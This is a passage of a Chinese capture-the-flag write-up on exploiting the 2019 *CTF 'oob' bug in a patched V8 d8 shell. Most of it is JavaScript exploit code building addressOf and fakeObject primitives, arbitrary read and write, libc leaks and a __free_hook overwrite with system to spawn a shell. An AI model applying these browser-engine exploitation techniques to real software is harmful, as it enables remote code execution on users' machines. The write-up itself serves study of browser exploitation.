<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br></pre></td></tr></table></figure>

<p>接着是泄露指定对象地址的<code>addressOf</code>函数，这里注意的是我们得到的数据都是浮点类型的数据，而我们需要的是内存中的<code>16</code>进制的数据，因此需要编写转换函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 泄露指定对象的地址</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj_to_leak</span>)&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> addr = <span class="title function_">f2i</span>(obj_array[<span class="number">0</span>])-<span class="number">1n</span>;<span class="comment">//1n是BigNumber</span></span><br><span class="line">    obj_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着是将给定内存地址伪造为指定<code>JS</code>对象的<code>fakeObject</code>，这里只需要修改<code>MAP</code>值就可以了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把某个地址转换为对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr_to_fake</span>)&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是<code>V8</code>会给对象的内存地址<code>+1</code>，因此我们获取得到的对象地址需要<code>-1</code>，在写入是需要将内存地址<code>+1</code>。</p>
<h3 id="获取任意内存读写"><a href="#获取任意内存读写" class="headerlink" title="获取任意内存读写"></a>获取任意内存读写</h3><p>如何凭借上面两个函数实现内存的任意读写呢。如果我们在一块内存区域内布置上伪造的数据结构，通过<code>fakeObject</code>将其强制转换为一个数组对象，由于<code>elements</code>指针是我们可控的，如果我们将该指针修改为我们想要访问的内存地址，后续对该数组对象的访问即为对修改后的内存地址指向的内存区域的访问，也就实现了内存的任意读写。</p>
<p>具体的构造如下，首先我们先创建一个浮点类型的数组对象<code>float_array</code>，可以用<code>addressOf</code>函数来泄露<code>float_array</code>的地址，然后通过<code>elements</code>地址与<code>fake_array</code>结构地址之前的关系即<code>address_elements = address_array - (0x10 + n*8)</code>，其中<code>n</code>为数组中元素的个数，既可以到的<code>elements</code>的地址。<code>elements+0x10</code>是<code>elements</code>中存储数据的区域。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,<span class="comment">//fake to be a float arr object</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),<span class="comment">//fake obj&#x27;s elements ptr</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>在得到<code>elements+0x10</code>即数据存储区域的地址之后可以利用<code>fakeObject</code>将该部分的内存区域强制转换为对象<code>fake_object</code>，之后我们访问对象<code>fake_object[0]</code>即访问的就是<code>0x41414141+0x10</code>指向的内存地址。任意内存读写的功能原语如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),<span class="comment">//fake obj&#x27;s elements ptr</span></span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr_addr = <span class="title function_">addressOf</span>(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_arr_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">fakeObject</span>(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//randomRead</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = <span class="title function_">f2i</span>(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] leak from: 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(leak_data));</span></span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = <span class="title function_">i2f</span>(data);</span><br><span class="line">    <span class="comment">//console.log(&quot;[*] write to : 0x&quot; +hex(addr) + &quot;: 0x&quot; + hex(data));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试一下代码发现已经可以任意读写</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805115702.png" alt="图片无法显示，请联系作者" title=" ">

<p>由于后续写入利用浮点类型数组写入会导致地址的低位被修改而无法正常写入，还可以利用<code>DataView</code>对象。<code>DataView</code>对象的<code>backing_store</code>会指向申请的<code>data_buf</code>，将该指针修改为我们想要任意写的内存地址，利用<code>setBigUint64</code>方法即可写入数据</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writeDataview</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line">    <span class="title function_">write64</span>(buf_backing_store_addr,addr);</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>,data,<span class="literal">true</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] write to : 0x&quot;</span> +<span class="title function_">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="title function_">hex</span>(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在传统的<code>pwn</code>中我们通过泄露出<code>libc</code>基址，计算出<code>free_hook,malloc_hook</code>，利用任意写将<code>hook</code>函数修改为<code>system,one_gadget</code>的地址从而实现<code>getshell</code>。这种思路在<code>v8</code>中也同样可以使用</p>
<p>此外，<code>v8</code>中还有一种<code>webassembly</code>即<code>wasm</code>技术，使得<code>v8</code>可以直接执行其他高级语言生成的机器码，加快运行效率，存储<code>wasm</code>的内存页是<code>rwx</code>权限的，因此我们可以将<code>shellcode</code>写入到原本属于<code>wasm</code>的内存页中，后续在调用<code>wasm</code>函数接口的时候，实际上就是调用了我们部署的<code>shellcode</code>。</p>
<h3 id="传统的堆利用思路"><a href="#传统的堆利用思路" class="headerlink" title="传统的堆利用思路"></a>传统的堆利用思路</h3><p>现在已经实现了内存任意写，后面就是泄露<code>libc</code>地址了。</p>
<h4 id="随机泄露"><a href="#随机泄露" class="headerlink" title="随机泄露"></a>随机泄露</h4><p>我们用<code>telescope</code>查看<code>JS</code>对象很远的内存区域</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x000008d78aa0f9c0-0x8000 0x500</span><br><span class="line">00:0000│   0x8d78aa079c0 —▸ 0x2fd70f04a4b9 ◂— 0x7100002beee20c04</span><br><span class="line">01:0008│   0x8d78aa079c8 —▸ 0x2fd70f04a4f1 ◂— 0x7100002beee20c04</span><br><span class="line">02:0010│   0x8d78aa079d0 —▸ 0x2fd70f04a529 ◂— 0x7100002beee20c04</span><br><span class="line">03:0018│   0x8d78aa079d8 —▸ 0x2fd70f04a561 ◂— 0x7100002beee20c04</span><br><span class="line">...</span><br><span class="line">4ab:2558│   0x8d78aa09f18 —▸ 0x555555eebe40 ◂— push   rbp <span class="comment"># d8中的指令</span></span><br><span class="line">4ac:2560│   0x8d78aa09f20 —▸ 0x2b619e680b71 ◂— 0x200002b619e6801</span><br><span class="line">4ad:2568│   0x8d78aa09f28 —▸ 0x555555eebe40 ◂— push   rbp</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap 0x555555eebe40</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x5555557e7000     0x5555562af000 r-xp   ac8000 293000 /home/pwn/Desktop/v8/v8-<span class="built_in">source</span>/v8/out.gn/x64.release/d8 +0x704e40</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/2gx 0x555555eebe40</span><br><span class="line">0x555555eebe40 &lt;v8::(anonymous namespace)::WebAssemblyCompile(v8::FunctionCallbackInfo&lt;v8::Value&gt; const&amp;)&gt;:	0x56415741e5894855	0xec81485354415541</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在距离<code>JS</code>对象很远内存区域中一定会存在<code>d8 binary</code>中的指令。而无论<code>ASLR</code>带来的地址如何随机化，其低地址的三个字节一定是<code>0xe40</code>，地址中存储的内容也一定会是<code>0x56415741e5894855</code>。</p>
<p>因此只要我们从<code>JS</code>对象的起始地址向低地址处搜索，每次读取<code>8</code>字节内容，如果低<code>3</code>字节的内容为<code>0xe40</code>，且该地址处存储的内容为<code>0x56415741e5894855</code>，则判断该地址即为<code>d8</code>中指令的地址了。获取地址的代码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line"><span class="keyword">var</span> start_addr = <span class="title function_">addressOf</span>(a);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = <span class="number">0n</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    start_addr -= <span class="number">0x8n</span>;</span><br><span class="line">    leak_d8_addr = <span class="title function_">read64</span>(start_addr);</span><br><span class="line">    <span class="keyword">if</span>((leak_d8_addr &amp; <span class="number">0xfffn</span>) == <span class="number">0x05b0n</span> &amp;&amp; <span class="title function_">read64</span>(leak_d8_addr) == <span class="number">0x56415741e5894855n</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Success find leak_d8_addr: 0x&quot;</span> + <span class="title function_">hex</span>(leak_d8_addr));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Done.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805124949.png" alt="图片无法显示，请联系作者" title=" ">

<p>那么在获取得到<code>d8</code>的指令地址之后，我们就可以计算出<code>d8</code>的基址，读取<code>got</code>表中的<code>malloc,free</code>的地址获取<code>libc</code>基址，覆盖<code>free_hook/malloc_hook</code>为<code>system/one_gadget</code>即可以<code>getshell</code>。需要注意的是这里借助<code>DataView</code>实现地址写入。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libc2.31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr - <span class="number">0x997e40n</span>;</span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0xd98730n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] d8_got_libc_start_main_addr: 0x&quot;</span> + <span class="title function_">hex</span>(d8_got_libc_start_main_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = <span class="title function_">read64</span>(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x1eeb28n</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_base_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc system address: 0x&quot;</span> + <span class="title function_">hex</span>(libc_system_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_free_hook_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">writeDataview</span>(libc_free_hook_addr, libc_system_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br></pre></td></tr></table></figure>

<p>由于<code>v8</code>在退出的时候会进行各种各样的<code>free</code>操作，因此一定会触发<code>free</code>。但是此时参数是不可控的，因此我们需要申请一个局部<code>buffer</code>，然后释放从而触发<code>free</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_shell</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.<span class="title function_">setFloat64</span>(<span class="number">0</span>, <span class="title function_">i2f</span>(<span class="number">0x0068732f6e69622fn</span>)); <span class="comment">// str --&gt; /bin/sh\x00 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">get_shell</span>();</span><br></pre></td></tr></table></figure>

<p>最终可以成功<code>getshell</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805131615.png" alt="图片无法显示，请联系作者" title=" ">

<h4 id="稳定泄露"><a href="#稳定泄露" class="headerlink" title="稳定泄露"></a>稳定泄露</h4><p>在<code>dbug</code>版本中<code>Array-&gt;MAP-&gt;constructor-&gt;code</code>内存的固定偏移处存储了<code>v8</code>二进制中特定的函数调用</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805142654.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们看到存在一个<code>Builtins_ArrayConstructor</code>函数的调用。在<code>debug</code>版本中，该函数的地址位于<code>libv8.so</code>中。而在<code>release</code>版本中，在调试中发现<code>MAP</code>结构中并没有存储<code>constructor</code>的地址，而是在数据结构<code>+0x28</code>位置。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805143347.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们看到<code>release</code>版本中存储的<code>Builtins_ArrayConstructor</code>函数调用位于<code>d8</code>中，因此我们就可以泄露出<code>d8</code>中的指令的地址，之后的<code>getshell</code>与随机泄露中相同。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805143522.png" alt="图片无法显示，请联系作者" title=" ">

<p><code>getshell</code>的脚本如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc2.31</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line"><span class="keyword">var</span> code_addr = <span class="title function_">read64</span>(<span class="title function_">addressOf</span>(a.<span class="property">constructor</span>) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find addressOf(a.constructor): 0x&quot;</span> + <span class="title function_">hex</span>(<span class="title function_">addressOf</span>(a.<span class="property">constructor</span>)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find code addr: 0x&quot;</span> + <span class="title function_">hex</span>(code_addr));</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = <span class="title function_">read64</span>(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + <span class="title function_">hex</span>(leak_d8_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//var d8_base_addr = leak_d8_addr - 0x997e40n;</span></span><br><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr - <span class="number">0xad54e0n</span>;</span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0xd98730n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] d8_got_libc_start_main_addr: 0x&quot;</span> + <span class="title function_">hex</span>(d8_got_libc_start_main_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = <span class="title function_">read64</span>(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x1eeb28n</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_base_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc system address: 0x&quot;</span> + <span class="title function_">hex</span>(libc_system_addr));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + <span class="title function_">hex</span>(libc_free_hook_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">writeDataview</span>(libc_free_hook_addr, libc_system_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_shell</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(get_shell_buffer);</span><br><span class="line">    get_shell_dataview.<span class="title function_">setFloat64</span>(<span class="number">0</span>, <span class="title function_">i2f</span>(<span class="number">0x0068732f6e69622fn</span>)); <span class="comment">// str --&gt; /bin/sh\x00 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">get_shell</span>();</span><br></pre></td></tr></table></figure>

<p>最终<code>getshell</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200805143736.png" alt="图片无法显示，请联系作者" title=" ">

<h3 id="wasm-Getshell"><a href="#wasm-Getshell" class="headerlink" title="wasm Getshell"></a>wasm Getshell</h3><p><code>wasm</code>从安全性上不允许通过浏览器直接调用系统函数，只能运行数学计算，图像处理等系统无关的高级语言代码。因此我们需要将原来<code>wasm</code>可执行内存空间中的代码替换为<code>shellcode</code>，进而执行。</p>
<p>可以从这个<a target="_blank" rel="noopener external nofollow noreferrer" href="https://wasdk.github.io/WasmFiddle/">网站</a>在线生成<code>wasm</code>的代码，调试的代码如下</p>
